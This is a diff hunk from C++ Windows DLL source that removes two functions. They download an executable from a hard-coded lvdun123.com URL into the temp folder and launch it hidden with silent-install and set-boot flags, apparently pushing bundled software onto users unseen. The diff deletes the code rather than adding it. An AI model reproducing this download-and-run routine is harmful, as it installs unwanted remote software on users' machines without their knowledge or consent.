@@ -348,56 +348,6 @@ extern "C" __declspec(dllexport) bool GetProfileFolder(char* szMainDir)	// ʧ�ܷ
 	return true;
 }
 
-
-DWORD WINAPI DownLoadWork(LPVOID pParameter)
-{
-	//TSAUTO();
-	CHAR szUrl[MAX_PATH] = {0};
-	strcpy(szUrl,(LPCSTR)pParameter);
-
-	CHAR szBuffer[MAX_PATH] = {0};
-	DWORD len = GetTempPathA(MAX_PATH, szBuffer);
-	if(len == 0)
-	{
-		return 0;
-	}
-	::PathCombineA(szBuffer,szBuffer,"GsSetup_0001.exe");
-	::CoInitialize(NULL);
-	HRESULT hr = E_FAIL;
-	__try
-	{
-		hr = ::URLDownloadToFileA(NULL, szUrl, szBuffer, 0, NULL);
-	}
-	__except(EXCEPTION_EXECUTE_HANDLER)
-	{
-		TSDEBUG4CXX("URLDownloadToCacheFile Exception !!!");
-	}
-	::CoUninitialize();
-	if (SUCCEEDED(hr) && ::PathFileExistsA(szBuffer))
-	{
-		::ShellExecuteA(NULL,"open",szBuffer,"/s /run /setboot", NULL, SW_HIDE);
-	}
-	return SUCCEEDED(hr)?ERROR_SUCCESS:0xFF;
-}
-
-extern "C" __declspec(dllexport) void DownLoadLvDunAndInstall()
-{
-	TSAUTO();
-	CHAR szUrl[] = "http://down.lvdun123.com/client/GsSetup_0001.exe";
-	DWORD dwThreadId = 0;
-	HANDLE hThread = CreateThread(NULL, 0, DownLoadWork, (LPVOID)szUrl,0, &dwThreadId);
-	if (NULL != hThread)
-	{
-		DWORD dwRet = WaitForSingleObject(hThread, INFINITE);
-		if (dwRet == WAIT_FAILED)
-		{
-			TSDEBUG4CXX("wait for DownLoa dBundled Software failed, error = " << ::GetLastError());
-		}
-		CloseHandle(hThread);
-	}
-	return;
-}
-
 DWORD WINAPI ThreadDownLoadUrl(LPVOID pParameter)
 {
 	//TSAUTO();
